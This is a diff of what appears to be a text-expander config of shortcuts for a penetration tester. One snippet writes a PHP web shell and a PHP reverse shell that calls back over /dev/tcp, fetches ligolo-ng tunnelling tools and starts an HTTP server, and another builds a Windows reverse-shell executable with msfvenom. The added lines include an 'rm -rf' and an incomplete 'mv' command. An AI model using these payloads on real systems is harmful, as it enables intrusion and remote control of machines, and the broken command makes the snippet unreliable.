@@ -23,6 +23,8 @@ matches:
 # SETUP AND NMAP              
   - trigger: ":setup"                  
     replace : |          
+      rm -rf ~/net
+      mkdir ~/box
       mkdir -p net && cd net         
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > webshell.php
       echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > revshell.php
@@ -41,6 +43,7 @@ matches:
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
       sudo python3 -m http.server 80 &
+      mv ~/box
 
   - trigger: ":msfwin"
     replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
